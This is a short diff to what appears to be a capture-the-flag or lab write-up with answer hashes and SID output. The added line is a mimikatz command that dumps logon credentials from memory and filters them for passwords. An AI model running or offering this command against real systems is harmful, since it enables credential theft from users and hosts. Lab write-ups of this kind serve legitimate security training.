@@ -1183,6 +1183,8 @@ SID               : S-1-5-21-3325992272-2815718403-617452758-1107
 
 **Answer:** `c39f2beb3d2ec06a62cb887fb391dee0`
 
+./mimikatz.exe "privilege::debug" "sekurlsa::LogonPasswords full" "exit" | select-string ssw
+
 ### Question:
 ![](./attachments/Pasted%20image%2020230208191329.png)
 
